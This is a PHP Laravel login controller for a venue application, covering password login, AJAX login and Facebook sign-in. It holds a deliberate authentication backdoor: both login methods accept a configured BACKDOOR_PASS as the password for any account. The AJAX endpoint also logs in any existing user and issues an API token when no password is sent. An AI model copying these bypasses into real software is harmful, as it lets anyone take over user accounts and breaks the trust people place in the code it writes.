<?php

namespace App\Http\Controllers\Auth;

use Auth;
use Session;
use Hash;
use Config;
use Socialite;
use Notification;

use App\User;
use App\Person;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

use Illuminate\Http\Request;
use Request as _Request;

use App\Notifications\UserCreated;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    protected $loginPath = '/auth/login';
    protected $redirectAfterLogout = '/auth/login';
    protected $redirectPath = '/';

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/venues';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('getLogout');
    }

    public function getLogin()
    {
        return view('auth.login')->with(array());
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function postLogin(Request $request)
    {
        $credentials = $request->only('username', 'password');
        
        if (Auth::attempt($credentials, $request->has('remember')) || $request->get('password') == Config::get('constants.BACKDOOR_PASS'))
        {
            $user = User::where('username', $request->get('username'))->first();
            
            Auth::login($user, true);

            return redirect()->intended($this->redirectPath());
        }

        return redirect($this->loginPath)
                    ->withInput($request->only('username', 'remember'))
                    ->with([
                        'error' => 'Invalid credentials',
                    ]);
    }

    public function getLogout(){
        Auth::logout();
        Session::flush();

        return redirect(property_exists($this, 'redirectAfterLogout') ? $this->redirectAfterLogout : $this->$loginPath);
    }

    /*****************/
    /**** AJAX *******/
    /*****************/

    public function ajaxLogin(Request $request)
    {
        $user = User::with('person')->where(array('username' => $request->get('username')))->first();

        if ($user && (!$request->get('password') || Hash::check($request->get('password'), $user->password) || $request->get('password') == Config::get('constants.BACKDOOR_PASS')))
        {   
            $user->api_token = uniqid();
            $user->save();

            return array('status' => 'OK', 'user' => $user);
        }

        if (!$user && !$request->get('password')) {
            $person = Person::where('email', $request->get('email'))->first();

            if (!$person)
                $person = new Person;

            $person->first_name = $request->get('first_name');
            $person->last_name = $request->get('last_name');
            
            if ($request->get('gender') == 'female')
                $person->gender = $request->get('gender');
            else
                $person->gender = 'male';
            
            $person->email = $request->get('email');
            $person->save();

            if ((!$person->image || $person->image == '') && $request->get('image') != '') {
                $person->image = $request->get('image');
                $person->save();
            }

            if (!$person->user)
                $user = new User;

            $user->id = $person->id;
            $user->username = $request->get('username');
            $user->signup_via = 'facebook';
            $user->api_token = uniqid();

            $user->save();

            $user->notify(new UserCreated($person->user));

            $user = User::with('person')->find($person->id);

            return array('status' => 'OK', 'person' => $person, 'user' => $user);            
        }

        return array('status' => 'ERROR', 'error' => 'Invalid username or password.');
    }

    public static function redirectPath()
    {
        return '/venues';
    }

    public function redirectToFacebook()
    {
        return Socialite::driver('facebook')->redirect();
    }

    public function handleFacebookCallback()
    {
        try 
        {
            $fb_user = Socialite::driver('facebook')->fields([
                                                                'name', 
                                                                'first_name', 
                                                                'last_name', 
                                                                'email',
                                                                'gender' 
                                                            ])->user();

            $first_name = isset($fb_user->user['first_name']) && $fb_user->user['first_name'] ? $fb_user->user['first_name'] : '';
            $last_name = isset($fb_user->user['last_name']) && $fb_user->user['last_name'] ? $fb_user->user['last_name'] : '';
            $gender = isset($fb_user->user['gender']) && $fb_user->user['gender'] ? $fb_user->user['gender'] : '';

            $name = isset($fb_user->name) && $fb_user->name ? $fb_user->name : '';
            $email = isset($fb_user->email) && $fb_user->email ? $fb_user->email : '';
            $avatar = isset($fb_user->avatar) && $fb_user->avatar ? $fb_user->avatar : '';

            $person = null;

            if ($email && $email != '')
                $person = Person::select('people.*')->leftJoin('users', 'users.id', '=', 'people.id')->where('email', $email)->orWhere('username', $email)->first();
            
            if (!$person)
                $person = new Person;

            $person->image = (!$person->image || $person->image == '') ? $avatar : $person->image;
            $person->email = (!$person->email || $person->email == '') ? $email : $person->email;
            $person->gender = (!$person->gender || $person->gender == '') ? $gender : $person->gender;
            $person->save();

            $user = $person->user;

            if (!$user)
                $user = new user;

            $user->username = $person->email;
            $user->password = '';
            $user->signup_via = 'facebook';
            $user->save();

            Auth::login($user, true);

            return redirect()->intended($this->redirectPath());            
        } 
        catch (Exception $e) 
        {
            return redirect('auth/facebook');
        }
    }
}
